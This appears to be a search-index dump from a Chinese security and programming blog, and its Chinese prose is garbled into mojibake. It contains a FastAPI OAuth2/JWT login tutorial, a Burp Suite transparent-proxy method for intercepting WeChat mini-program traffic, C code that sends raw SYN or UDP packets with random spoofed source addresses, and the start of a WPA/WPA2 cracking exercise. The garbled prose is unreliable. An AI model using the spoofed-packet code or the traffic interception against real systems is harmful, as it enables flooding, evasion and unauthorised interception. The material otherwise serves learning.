å…³äºæ•°æ®åº“æ“ä½œï¼Œè¿™é‡Œåªæ¶‰åŠåˆ°å¢å’ŒæŸ¥æ“ä½œã€‚ç”±äº username å”¯ä¸€ï¼Œå¯ä»¥ä½¿ç”¨ username ä½œä¸ºå…³é”®å­—æŸ¥è¯¢ã€‚ åœ¨æ’å…¥æ•°æ®å‰ï¼Œéœ€è¦å°†ç”¨æˆ·ä¼ å…¥çš„æ•°æ®è§£æ„å¹¶æ„å»º User æ•°æ®åº“å¯¹è±¡ã€‚ ","date":"2021-01-10","objectID":"/fastapi-auth/:2:5","tags":["Python","FastAPI","è®¤è¯","JWT","é¡¹ç›®"],"title":"ä¹…ä»°å¤§åï¼šåŸºäº FastAPI å®ç° OAuth2 ç™»å½•è®¤è¯","uri":"/fastapi-auth/"},{"categories":["æ¢ç´¢"],"content":"è®¤è¯åŠŸèƒ½å®ç° æˆ‘ä»¬è®¡åˆ’ç”¨ OAuth2 çš„ç”¨æˆ·åå¯†ç è®¤è¯ï¼Œå¹¶å°†ç”¨æˆ·å¯†ç å“ˆå¸Œåå­˜å…¥æ•°æ®åº“ã€‚ä¸ºäº†ç»´æŠ¤ç™»é™†çŠ¶æ€ï¼Œè¿™é‡Œé‡‡ç”¨ jwt ä»£æ›¿è¾ƒä¸ºç¹ççš„ cookie æœºåˆ¶ã€‚ ","date":"2021-01-10","objectID":"/fastapi-auth/:3:0","tags":["Python","FastAPI","è®¤è¯","JWT","é¡¹ç›®"],"title":"ä¹…ä»°å¤§åï¼šåŸºäº FastAPI å®ç° OAuth2 ç™»å½•è®¤è¯","uri":"/fastapi-auth/"},{"categories":["æ¢ç´¢"],"content":"æ³¨å†Œ æ³¨å†Œéƒ¨åˆ†è¾ƒä¸ºç®€å•ï¼ˆéªŒè¯ç ç­‰éƒ¨åˆ†ä¸ä¸»é¢˜æ— å…³ï¼Œæœªå±•ç¤ºï¼‰ï¼Œåœ¨ users.py ä¸­ç¼–å†™è·¯ç”±å‡½æ•°ï¼š from fastapi import APIRouter, Depends, HTTPException from sqlalchemy.orm import Session from sqlalchemy.exc import IntegrityError from . import crud from .auth import get_current_user, auth_user, gen_token, hash_password from .schemas import User, UserCreate from ..db import get_db router = APIRouter() # ... @router.post('/') def create(param: UserCreate, db: Session = Depends(get_db)): param.password = hash_password(param.password) try: target = crud.create(db=db, param=param) except IntegrityError: raise HTTPException(status_code=400, detail='Duplicate username') return 0 åˆ©ç”¨ Depends(get_db) è·å–ä¸€ä¸ªæ•°æ®åº“ Sessionï¼Œç„¶åå€ŸåŠ© crud.create æ’å…¥å¯†ç è¢«å“ˆå¸Œåçš„ç”¨æˆ·æ•°æ®ã€‚è¿™é‡Œçš„ hash_password æ¥æºäº auth.pyï¼š from passlib.context import CryptContext pwd_context = CryptContext(schemes=['bcrypt'], deprecated='auto') def hash_password(password): return pwd_context.hash(password) æˆ‘ä»¬é‡‡ç”¨äº† bcrypt ç®—æ³•è¿›è¡Œå“ˆå¸Œã€‚åŒç†ï¼ŒéªŒè¯å‡½æ•°åŒæ ·ç®€å•ï¼š def verify_password(plain, hashed): return pwd_context.verify(plain, hashed) ","date":"2021-01-10","objectID":"/fastapi-auth/:3:1","tags":["Python","FastAPI","è®¤è¯","JWT","é¡¹ç›®"],"title":"ä¹…ä»°å¤§åï¼šåŸºäº FastAPI å®ç° OAuth2 ç™»å½•è®¤è¯","uri":"/fastapi-auth/"},{"categories":["æ¢ç´¢"],"content":"ç™»å½•ï¼šéªŒè¯ç”¨æˆ·ä¿¡æ¯ å¯¹äºç»™å®šçš„ username å’Œ passwordï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡æ•°æ®åº“æŸ¥è¯¢éªŒè¯ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦åˆæ³•ï¼š from sqlalchemy.orm import Session from . import crud def auth_user(db: Session, username: str, password: str): user = crud.get(db=db, username=username) if user is None: return False if not verify_password(password, user.password): return False return user æ ¹æ® OAuth2 æ ‡å‡†ï¼Œæ¥æ”¶ç”¨æˆ·åå’Œå¯†ç æ—¶éœ€è¦ä½¿ç”¨ application/x-www-form-urlencoded æ ¼å¼ï¼Œå½“ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯æ—¶è¿”å› 401ï¼Œä¸”è¿”å›è‡ªå®šä¹‰ HTTP å¤´ WWW-Authenticate: Bearerï¼Œå…¶ä¸­ Bearer æ˜¯æˆ‘ä»¬è¿™é‡Œä½¿ç”¨çš„æºå¸¦ token çš„æ–¹å¼ï¼š from typing import Dict from fastapi.security import OAuth2PasswordRequestForm @router.post('/login', response_model=Dict[str, str]) def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)): user = auth_user(db, form_data.username, form_data.password) if not user: raise HTTPException( status_code=401, detail='Incorrect username or password', headers={'WWW-Authenticate': 'Bearer'}) # ... ","date":"2021-01-10","objectID":"/fastapi-auth/:3:2","tags":["Python","FastAPI","è®¤è¯","JWT","é¡¹ç›®"],"title":"ä¹…ä»°å¤§åï¼šåŸºäº FastAPI å®ç° OAuth2 ç™»å½•è®¤è¯","uri":"/fastapi-auth/"},{"categories":["æ¢ç´¢"],"content":"ç™»å½•ï¼šç”Ÿæˆ jwt å¯¹äºç»™å®šçš„æ•°æ®ä»¥åŠ token å¤±æ•ˆæ—¶é—´ï¼Œå€ŸåŠ© python-jose åº“ï¼Œå‚è€ƒ jwt æ ‡å‡†ç”Ÿæˆ jwtï¼š from jose import JWTError, jwt from datetime import datetime, timedelta from .config import SECRET_KEY, ALGORITHM def gen_token(data: dict, expires_delta: timedelta = None): to_encode = data.copy() if expires_delta: expire = datetime.utcnow() + expires_delta else: expire = datetime.utcnow() + timedelta(minutes=15) to_encode.update({'exp': expire}) encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM) return encoded_jwt è¿™é‡Œçš„ dataï¼Œæ ¹æ® jwt æ ‡å‡†å¯ä»¥è®¾ç½® sub å­—æ®µä¸ºç”¨æˆ·çš„ usernameï¼Œå¤±æ•ˆæ—¶é—´ä¹Ÿå¯ä»¥åœ¨ç¨‹åºä¸­è‡ªå®šä¹‰ï¼š from .config import ACCESS_TOKEN_EXPIRE_MINUTES @router.post('/login', response_model=Dict[str, str]) def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)): user = auth_user(db, form_data.username, form_data.password) if not user: raise HTTPException( status_code=401, detail='Incorrect username or password', headers={'WWW-Authenticate': 'Bearer'}) access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES) access_token = gen_token( data={'sub': user.username}, expires_delta=access_token_expires) return { 'access_token': access_token, 'token_type': 'bearer' } æœ€åæ ¹æ® OAuth2 æ ‡å‡†è¿”å› {access_token, token_type} å¯¹è±¡ã€‚ ","date":"2021-01-10","objectID":"/fastapi-auth/:3:3","tags":["Python","FastAPI","è®¤è¯","JWT","é¡¹ç›®"],"title":"ä¹…ä»°å¤§åï¼šåŸºäº FastAPI å®ç° OAuth2 ç™»å½•è®¤è¯","uri":"/fastapi-auth/"},{"categories":["æ¢ç´¢"],"content":"æ ¹æ® jwt è·å–ç”¨æˆ·ä¿¡æ¯ å…ˆé€šè¿‡ jwt.decode è§£ç ä¿¡æ¯å¹¶éªŒè¯ç­¾åï¼Œéšåå¯¹å¾—åˆ°çš„ä¿¡æ¯è¿›è¡Œè§£æï¼Œæœ€åå›åˆ°æ•°æ®åº“ä¸­éªŒè¯è§£æåçš„ä¿¡æ¯ï¼š from fastapi import Depends, HTTPException from fastapi.security import OAuth2PasswordBearer from ..db import get_db oauth2_scheme = OAuth2PasswordBearer(tokenUrl='users/login') def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)): credentials_exception = HTTPException( status_code=401, detail='Could not validate credentials', headers={'WWW-Authenticate': 'Bearer'}) try: payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM]) username: str = payload.get('sub') if username is None: raise credentials_exception except JWTError: raise credentials_exception user = crud.get(db=db, username=username) if user is None: raise credentials_exception return user è¿™é‡Œ OAuth2PasswordBearer(tokenUrl='users/login') å®é™…ä¸Šå’Œ login å‡½æ•°çš„å‚æ•° form_data: OAuth2PasswordRequestForm å¯¹åº”ï¼Œå½¢æˆå®Œæ•´çš„ OAuth2 password flowã€‚ ç„¶ååœ¨ users.py ä¸­æš´éœ²è·å–å½“å‰ç™»é™†ç”¨æˆ·ä¿¡æ¯çš„æ¥å£ï¼š @router.get('/', response_model=User) async def get(current_user: User = Depends(get_current_user)): return current_user ","date":"2021-01-10","objectID":"/fastapi-auth/:3:4","tags":["Python","FastAPI","è®¤è¯","JWT","é¡¹ç›®"],"title":"ä¹…ä»°å¤§åï¼šåŸºäº FastAPI å®ç° OAuth2 ç™»å½•è®¤è¯","uri":"/fastapi-auth/"},{"categories":["æ¢ç´¢"],"content":"æµ‹è¯• åœ¨ app/ æ‰€åœ¨ç›®å½•è¿è¡Œï¼š python3 -m uvicorn app.main:app --reload éšåè®¿é—® http://localhost:8000/docs å³å¯çœ‹åˆ° swagger æ–‡æ¡£ã€‚ å›¾ 1 \" å›¾ 1 å›¾ 2 \" å›¾ 2 ","date":"2021-01-10","objectID":"/fastapi-auth/:4:0","tags":["Python","FastAPI","è®¤è¯","JWT","é¡¹ç›®"],"title":"ä¹…ä»°å¤§åï¼šåŸºäº FastAPI å®ç° OAuth2 ç™»å½•è®¤è¯","uri":"/fastapi-auth/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"ä»¥ Burpsuite ä¸ºä¾‹ã€‚ ","date":"2020-12-01","objectID":"/mini-capture/:0:0","tags":["å¾®ä¿¡","ç½‘ç»œ","DNS"],"title":"é€æ˜ä»£ç†ï¼šæŠ“å–å¾®ä¿¡å°ç¨‹åºæ•°æ®åŒ…","uri":"/mini-capture/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"èƒŒæ™¯ ä¹‹å‰é’ˆå¯¹æŸæ‰“å¡ç³»ç»Ÿå†™äº†æ¯å¤©è‡ªåŠ¨æ‰“å¡çš„è„šæœ¬ï¼Œä»Šå¤©ä¸€è§‰é†’æ¥å‘ç°åç«¯æ›´æ–°å¯¼è‡´è„šæœ¬å¤±æ•ˆäº†ï¼Œæ”¹è„šæœ¬çš„åŒæ—¶æŠŠä¹‹å‰æœåˆ°çš„æŠ“å¾®ä¿¡å°ç¨‹åºåŒ…çš„æ–¹æ³•è®°å½•ä¸‹æ¥å¤‡ç”¨ã€‚ ","date":"2020-12-01","objectID":"/mini-capture/:1:0","tags":["å¾®ä¿¡","ç½‘ç»œ","DNS"],"title":"é€æ˜ä»£ç†ï¼šæŠ“å–å¾®ä¿¡å°ç¨‹åºæ•°æ®åŒ…","uri":"/mini-capture/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"æ­¥éª¤ ","date":"2020-12-01","objectID":"/mini-capture/:2:0","tags":["å¾®ä¿¡","ç½‘ç»œ","DNS"],"title":"é€æ˜ä»£ç†ï¼šæŠ“å–å¾®ä¿¡å°ç¨‹åºæ•°æ®åŒ…","uri":"/mini-capture/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"è·å–å°ç¨‹åºåç«¯åŸŸå è¿›å…¥å°ç¨‹åºåç‚¹å³ä¸Šè§’ Â·Â·Â· -\u003e ç‚¹å‡»å°ç¨‹åºå -\u003e ç»§ç»­å³ä¸Šè§’ Â·Â·Â· -\u003e æ›´å¤šèµ„æ–™ å³å¯çœ‹åˆ°åŸŸåã€‚å‡è®¾ä¸º example.comã€‚ ","date":"2020-12-01","objectID":"/mini-capture/:2:1","tags":["å¾®ä¿¡","ç½‘ç»œ","DNS"],"title":"é€æ˜ä»£ç†ï¼šæŠ“å–å¾®ä¿¡å°ç¨‹åºæ•°æ®åŒ…","uri":"/mini-capture/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"è§£æåç«¯çœŸå® IP ç›´æ¥ ping å°±è¡Œï¼Œåˆ«çš„åŠæ³•å¦‚ DNS æŸ¥è¯¢ä¹Ÿè¡Œã€‚å‡è®¾å¾—åˆ° IP ä¸º a.b.c.dã€‚ ","date":"2020-12-01","objectID":"/mini-capture/:2:2","tags":["å¾®ä¿¡","ç½‘ç»œ","DNS"],"title":"é€æ˜ä»£ç†ï¼šæŠ“å–å¾®ä¿¡å°ç¨‹åºæ•°æ®åŒ…","uri":"/mini-capture/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"ä¿®æ”¹ Burpsuite é…ç½® Proxy -\u003e Options -\u003e Proxy Listeners å°†ä»£ç†æœåŠ¡å™¨è®¾ç½®ä¸ºç›‘å¬æ‰€æœ‰ç½‘å¡ï¼ˆAll Interfacesï¼‰ï¼Œç«¯å£ 443ï¼Œå¹¶å¼€å¯é€æ˜ä»£ç†ï¼ˆSupport invisible proxyingï¼‰ã€‚ Project Options -\u003e Connections -\u003e Hostname Resolution ä¸­æ‰‹åŠ¨è®¾ç½®åŸŸåè§£æï¼Œå°† example.com è§£æåˆ° a.b.c.dã€‚ ","date":"2020-12-01","objectID":"/mini-capture/:2:3","tags":["å¾®ä¿¡","ç½‘ç»œ","DNS"],"title":"é€æ˜ä»£ç†ï¼šæŠ“å–å¾®ä¿¡å°ç¨‹åºæ•°æ®åŒ…","uri":"/mini-capture/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"ä¿®æ”¹æœ¬æœº Hosts æ–‡ä»¶ ç¼–è¾‘ C:\\Windows\\System32\\drivers\\etc\\hosts ï¼ˆLinux ä¸‹ä¸º /etc/hostsï¼‰ï¼Œæ·»åŠ ä¸€è¡Œï¼š 127.0.0.1 example.com æœ€ååœ¨ç”µè„‘ä¸Šæ‰“å¼€å¾®ä¿¡å°ç¨‹åºå¹¶ç”¨ Burpsuite æŠ“åŒ…ã€‚ ","date":"2020-12-01","objectID":"/mini-capture/:2:4","tags":["å¾®ä¿¡","ç½‘ç»œ","DNS"],"title":"é€æ˜ä»£ç†ï¼šæŠ“å–å¾®ä¿¡å°ç¨‹åºæ•°æ®åŒ…","uri":"/mini-capture/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"åŸç† å›¾ 1ï½œåŸç†ç¤ºæ„å›¾ \" å›¾ 1ï½œåŸç†ç¤ºæ„å›¾ ","date":"2020-12-01","objectID":"/mini-capture/:3:0","tags":["å¾®ä¿¡","ç½‘ç»œ","DNS"],"title":"é€æ˜ä»£ç†ï¼šæŠ“å–å¾®ä¿¡å°ç¨‹åºæ•°æ®åŒ…","uri":"/mini-capture/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å®ä¹ çš„æ—¶å€™å†™çš„ä¸€å°æ®µä»£ç ã€‚ è¦æ±‚æ˜¯ç”¨ C/C++ å†™å‘é€ RAW æ•°æ®åŒ…çš„å·¥å…·ï¼Œéœ€è¦æ”¯æŒ TCP å’Œ UDPã€‚æŸ¥äº†ä¸‹èµ„æ–™å‘ç°æ¯”æƒ³è±¡çš„è¦å¤æ‚ï¼Œå¹¶ä¸”åªå‘ç°äº†å‘é€ ICMP RAW æ•°æ®åŒ…çš„æ ·ä¾‹ï¼Œç…§ç€æ”¹äº†æ”¹ã€‚ ","date":"2020-11-16","objectID":"/raw-packet/:0:0","tags":["C/C++","ç½‘ç»œ"],"title":"ç®—æ— é—ç­–ï¼šsocket ç¼–ç¨‹å‘é€ RAW æ•°æ®åŒ…","uri":"/raw-packet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å¤§è‡´éœ€æ±‚ æ•°æ®åŒ…ä»¥ RAW æ–¹å¼å‘é€ æ”¯æŒ TCP å’Œ UDP åè®® å‘é€åœ°å€ç”±ä½¿ç”¨è€…æŒ‡å®š æºåœ°å€éšæœº å‘é€æ¶ˆæ¯å†…å®¹éšæœº ","date":"2020-11-16","objectID":"/raw-packet/:1:0","tags":["C/C++","ç½‘ç»œ"],"title":"ç®—æ— é—ç­–ï¼šsocket ç¼–ç¨‹å‘é€ RAW æ•°æ®åŒ…","uri":"/raw-packet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"ä¸€äº›å›ºå®šçš„éƒ¨åˆ† å¤´æ–‡ä»¶ raw.h ä¸­å­˜åœ¨ä¸€ä¸ªå›ºå®šçš„ç»“æ„ä½“å’Œå›ºå®šçš„å‡½æ•°ï¼š extern int errno; #pragma pack(1) typedef struct PACKET_RAW_HEADER { uint32_t dwIP; uint16_t uPort; PACKET_RAW_HEADER() : dwIP(0), uPort(0) {} } PacketRawHeader, * pPacketRawHeader; #pragma pack() int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP); ä¹‹åçš„ä¿®æ”¹éƒ½å¿…é¡»åŸºäºè¿™äºŒè€…è¿›è¡Œã€‚ å› æ­¤å¯ä»¥æ ¹æ®è¿™äº›å›ºå®šçš„éƒ¨åˆ†å…ˆæŠŠä¸»å‡½æ•°å†™å¥½ï¼š #include \"raw.h\" int main(int argc, char *argv[]) { if (argc != 4) { printf(\"Usage: %s [ip] [port] [tcp|udp]\\n\", argv[0]); exit(-1); } PacketRawHeader *pPacketRawHeader = new PacketRawHeader(); pPacketRawHeader-\u003edwIP = inet_addr(argv[1]); pPacketRawHeader-\u003euPort = htons(atoi(argv[2])); bool bTCP = true; if (!strcmp(argv[3], \"udp\")) { bTCP = false; } printf(\"%s\\n\", strerror(sendrawpacket(pPacketRawHeader, bTCP))); return 0; } éšååœ¨ä¸»è¦éœ€è¦ä¿®æ”¹çš„ sendrawpacket å‡½æ•°ä¸­å¤„ç†ä¸­æ–­ï¼Œå…³é—­ socketï¼š int sockfd; int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { signal (SIGINT, interrupt_handler); signal (SIGTERM, interrupt_handler); } void interrupt_handler (int signum) { close(sockfd); free(clientaddr); exit(0); } ","date":"2020-11-16","objectID":"/raw-packet/:2:0","tags":["C/C++","ç½‘ç»œ"],"title":"ç®—æ— é—ç­–ï¼šsocket ç¼–ç¨‹å‘é€ RAW æ•°æ®åŒ…","uri":"/raw-packet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"ä¸»è¦é€»è¾‘ ","date":"2020-11-16","objectID":"/raw-packet/:3:0","tags":["C/C++","ç½‘ç»œ"],"title":"ç®—æ— é—ç­–ï¼šsocket ç¼–ç¨‹å‘é€ RAW æ•°æ®åŒ…","uri":"/raw-packet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"åˆ›å»º socket int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { //... if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) \u003c0) { fprintf(stderr,\"Error creating socket:%s\\n\", strerror(errno)); return errno; } //... } æ ¹æ®è¦æ±‚ï¼Œéœ€è¦é‡‡ç”¨ SOCK_RAW + IPPROTO_RAW çš„æ–¹å¼åˆ›å»º socketã€‚æ­¤æ—¶å¿…é¡»è‡ªå·±å¡«å…… IP å¤´éƒ¨ ä»¥åŠ TCP/UDP å¤´éƒ¨ã€‚ ","date":"2020-11-16","objectID":"/raw-packet/:3:1","tags":["C/C++","ç½‘ç»œ"],"title":"ç®—æ— é—ç­–ï¼šsocket ç¼–ç¨‹å‘é€ RAW æ•°æ®åŒ…","uri":"/raw-packet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"è®¾ç½®åœ°å€ è®¾ç½®ç›®æ ‡åœ°å€ï¼Œè¯¥åœ°å€ç”±å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šï¼š struct sockaddr_in* clientaddr = NULL; int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { //... clientaddr = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in)); if (clientaddr == NULL) { fprintf(stderr,\"Error allocating memory:%s\\n\", strerror(errno)); goto end; } clientaddr-\u003esin_family = AF_INET; clientaddr-\u003esin_port = pRawHeader-\u003euPort; clientaddr-\u003esin_addr.s_addr = pRawHeader-\u003edwIP; //... end: close(sockfd); return errno; } è€Œæºåœ°å€åˆ™ç”±ç¨‹åºéšæœºç”Ÿæˆï¼š int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { char buffer[BUF_LEN] = {0}; char src_ip[20] = {0}; uint16_t src_port; char *string_data = NULL; size_t hdr_size = (bTCP ? (THDR_SZ) : (UHDR_SZ)); //... srand(time(NULL)); string_data = (char *) (buffer + IPHDR_SZ + hdr_size); for (int i = 0; i \u003c MSG_LEN; ++i) { string_data[i] = '0' + rand()%72; } string_data[MSG_LEN] = 0; printf(\"Message: %s\\n\", string_data); sprintf(src_ip,\"%d.%d.%d.%d\", rand()%256, rand()%256, rand()%256, rand()%256); src_port = rand()%65535 + 1; printf(\"Source IP: %s\\nSource Port: %d\\n\", src_ip, src_port); //... } å…¶ä¸­å®šä¹‰çš„å®å¦‚ä¸‹ï¼š #define BUF_LEN 1024 #define MSG_LEN 50 #define IPHDR_SZ sizeof(struct iphdr) #define THDR_SZ sizeof(struct tcphdr) #define UHDR_SZ sizeof(struct udphdr) è¿™é‡Œç”¨ buffer å­˜æ”¾å®Œæ•´çš„æŠ¥æ–‡ï¼Œstring_data å­˜æ”¾æ¶ˆæ¯ï¼ŒæŠ¥æ–‡ç»“æ„å®é™…ä¸Šæ˜¯ï¼š ------------------------------------------ | IP Header | TCP/UDP Header | string_data | ------------------------------------------ \\ / ---------------- buffer ----------------- ","date":"2020-11-16","objectID":"/raw-packet/:3:2","tags":["C/C++","ç½‘ç»œ"],"title":"ç®—æ— é—ç­–ï¼šsocket ç¼–ç¨‹å‘é€ RAW æ•°æ®åŒ…","uri":"/raw-packet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å¡«å…… IP å¤´éƒ¨ int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { // ... struct iphdr *ip_hdr = (struct iphdr *)buffer; //... ip_hdr-\u003eihl = 5; ip_hdr-\u003eversion = 4; ip_hdr-\u003etos = 0; ip_hdr-\u003etot_len = IPHDR_SZ + hdr_size + strlen(string_data); ip_hdr-\u003ettl = 64; ip_hdr-\u003eprotocol = (bTCP ? IPPROTO_TCP : IPPROTO_UDP); ip_hdr-\u003esaddr = inet_addr(src_ip); ip_hdr-\u003edaddr = clientaddr-\u003esin_addr.s_addr; ip_hdr-\u003echeck = csum((unsigned short *)ip_hdr, ip_hdr-\u003etot_len); //... } è¿™é‡Œéœ€è¦å¯¹ IP å¤´éƒ¨è®¡ç®—æ ¡éªŒå’Œï¼Œè®¡ç®—æ–¹æ³•å’Œä¹‹å TCP / UDP å¤´éƒ¨æ ¡éªŒå’Œè®¡ç®—æ–¹æ³•ç›¸åŒï¼Œæ¯ 16 bit è¿›è¡Œåç æ±‚å’Œï¼š unsigned short csum(unsigned short *ptr, int nbytes) { register long sum; unsigned short oddbyte; register short answer; sum = 0; while (nbytes\u003e 1) { sum += *ptr++; nbytes -= 2; } if (nbytes == 1) { oddbyte = 0; *((u_char*)\u0026oddbyte) = *(u_char*)ptr; sum += oddbyte; } sum = (sum\u003e\u003e16) + (sum \u0026 0xffff); sum = sum + (sum\u003e\u003e16); answer = (short)~sum; return (answer); } ","date":"2020-11-16","objectID":"/raw-packet/:3:3","tags":["C/C++","ç½‘ç»œ"],"title":"ç®—æ— é—ç­–ï¼šsocket ç¼–ç¨‹å‘é€ RAW æ•°æ®åŒ…","uri":"/raw-packet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å¡«å…… TCP / UDP å¤´éƒ¨ int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { // ... struct tcphdr *tcp_hdr = (struct tcphdr *)(buffer + IPHDR_SZ); struct udphdr *udp_hdr = (struct udphdr *)(buffer + IPHDR_SZ); //... if (bTCP) { tcp_hdr-\u003esource = htons(src_port); tcp_hdr-\u003edest = clientaddr-\u003esin_port; tcp_hdr-\u003edoff = 5; tcp_hdr-\u003ewindow = htons(200); tcp_hdr-\u003esyn = 1; } else { udp_hdr-\u003esource = htons(src_port); udp_hdr-\u003edest = clientaddr-\u003esin_port; udp_hdr-\u003elen = htons(8 + strlen(string_data)); } //... } è¿™é‡Œåè®®å¤´éƒ¨ä¸­ä½¿ç”¨äº†ä¸€äº›å¸¸ç”¨çš„å‚æ•°å€¼ï¼Œä½¿ç”¨ TCP åè®®æ—¶å‘é€ SYN åŒ…ã€‚ ","date":"2020-11-16","objectID":"/raw-packet/:3:4","tags":["C/C++","ç½‘ç»œ"],"title":"ç®—æ— é—ç­–ï¼šsocket ç¼–ç¨‹å‘é€ RAW æ•°æ®åŒ…","uri":"/raw-packet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å¡«å…… TCP / UDP ä¼ªå¤´éƒ¨ å…ˆå®šä¹‰ä¼ªå¤´éƒ¨ç»“æ„ä½“ï¼š struct pseudo_iphdr { uint32_t source_ip_addr; uint32_t dest_ip_addr; uint8_t fixed; uint8_t protocol; uint16_t len; }; #define PHDR_SZ sizeof(struct pseudo_iphdr) éšåå¡«å……ä¼ªå¤´éƒ¨ï¼š int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { // ... struct pseudo_iphdr csum_hdr; //... csum_hdr.source_ip_addr = ip_hdr-\u003esaddr; csum_hdr.dest_ip_addr = clientaddr-\u003esin_addr.s_addr; csum_hdr.fixed = 0; csum_hdr.protocol = (bTCP ? IPPROTO_TCP : IPPROTO_UDP); csum_hdr.len = htons(hdr_size + strlen(string_data)); //... } ","date":"2020-11-16","objectID":"/raw-packet/:3:5","tags":["C/C++","ç½‘ç»œ"],"title":"ç®—æ— é—ç­–ï¼šsocket ç¼–ç¨‹å‘é€ RAW æ•°æ®åŒ…","uri":"/raw-packet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"è®¡ç®— TCP / UDP æ ¡éªŒå’Œ å¡«å……å¥½ä¼ªå¤´éƒ¨åï¼Œä¾¿å¯ä»¥è®¡ç®—æ ¡éªŒå’Œäº†ã€‚é¦–å…ˆå°†éœ€è¦æ ¡éªŒçš„éƒ¨åˆ†æ”¾è¿› csum_buffer ä¸­ï¼Œä¹Ÿå°±æ˜¯ä¼ªå¤´éƒ¨ + å¤´éƒ¨ + æ•°æ®ã€‚éšåç”¨ csum å‡½æ•°è®¡ç®—æ ¡éªŒå’Œå¹¶å¡«å…¥ç›¸åº”å­—æ®µï¼š int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { // ... char *csum_buffer = NULL; size_t psize; //... psize = PHDR_SZ + hdr_size + strlen(string_data); csum_buffer = (char *)calloc(psize, sizeof(char)); if (csum_buffer == NULL) { fprintf(stderr,\"Error allocating memory:%s\\n\", strerror(errno)); goto end1; } memcpy(csum_buffer, (char *)\u0026csum_hdr, PHDR_SZ); memcpy(csum_buffer + PHDR_SZ, udp_hdr, hdr_size + strlen(string_data)); if (bTCP) { tcp_hdr-\u003echeck = csum((unsigned short *) csum_buffer, psize); } else { udp_hdr-\u003echeck = csum((unsigned short *) csum_buffer, psize); } free (csum_buffer); csum_buffer = NULL; //... end1: free(clientaddr); clientaddr = NULL; end: close(sockfd); return errno; } æ­¤æ—¶æŠ¥æ–‡å¤§æ¦‚æ˜¯è¿™æ ·ï¼š ---------------------------------------------------- | ... | Pseudo Header | TCP/UDP Header | string_data | ---------------------------------------------------- \\ / ---- IP Header ---- \\ / ---------------------- buffer --------------------- ","date":"2020-11-16","objectID":"/raw-packet/:3:6","tags":["C/C++","ç½‘ç»œ"],"title":"ç®—æ— é—ç­–ï¼šsocket ç¼–ç¨‹å‘é€ RAW æ•°æ®åŒ…","uri":"/raw-packet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å‘é€æ•°æ®åŒ… ç›´æ¥ä½¿ç”¨ sendto æŒ‡å®šåœ°å€ä¸º clientaddr å³å¯ã€‚ int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { //... if (sendto(sockfd, buffer, ip_hdr-\u003etot_len, 0, (struct sockaddr *)clientaddr, sizeof(struct sockaddr_in)) \u003c0) { fprintf(stderr,\"Error sending message:%s\\n\", strerror(errno)); goto end1; } end1: free(clientaddr); clientaddr = NULL; end: close(sockfd); return errno; } æœ€åï¼Œå¯ä»¥ä½¿ç”¨ wireshark è¿›è¡Œæµ‹è¯•ï¼Œå¹¶æ‰“å¼€æ ¡éªŒå’ŒéªŒè¯åŠŸèƒ½ã€‚ ","date":"2020-11-16","objectID":"/raw-packet/:3:7","tags":["C/C++","ç½‘ç»œ"],"title":"ç®—æ— é—ç­–ï¼šsocket ç¼–ç¨‹å‘é€ RAW æ•°æ®åŒ…","uri":"/raw-packet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"ã€Šæ— çº¿ç½‘ç»œå®‰å…¨ã€‹ä½œä¸šã€‚æ¢¦å›å¤§ä¸€ã€‚ ","date":"2020-10-18","objectID":"/aircrack-wpa/:0:0","tags":["Kali","ç½‘ç»œ"],"title":"çª¥é—´ä¼ºéš™ï¼šAircrack å¥—ä»¶ç ´è§£ WPA/WPA2 å¯†ç ","uri":"/aircrack-wpa/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å‡†å¤‡å·¥ä½œ æ‰‹æœºå¼€å¯çƒ­ç‚¹ï¼Œè®¾ç½®å¼±å¯†ç  merc123321ï¼Œçƒ­ç‚¹ SSID ä¸º nova 4ã€‚ç‰©ç†æœºè¿æ¥ nova 4 æ— çº¿ç½‘ç»œä½œä¸ºè¢«å®³ä¸»æœºã€‚ å›¾ 1 \" å›¾ 1 ä¸º Kali è™šæ‹Ÿæœºæ·»åŠ æ— çº¿ç½‘å¡ï¼Œéšåå³å¯åœ¨ ifconfig çš„è¾“å‡ºä¸­çœ‹åˆ° wlan0 ç½‘å¡ï¼š å›¾ 2 \" å›¾ 2 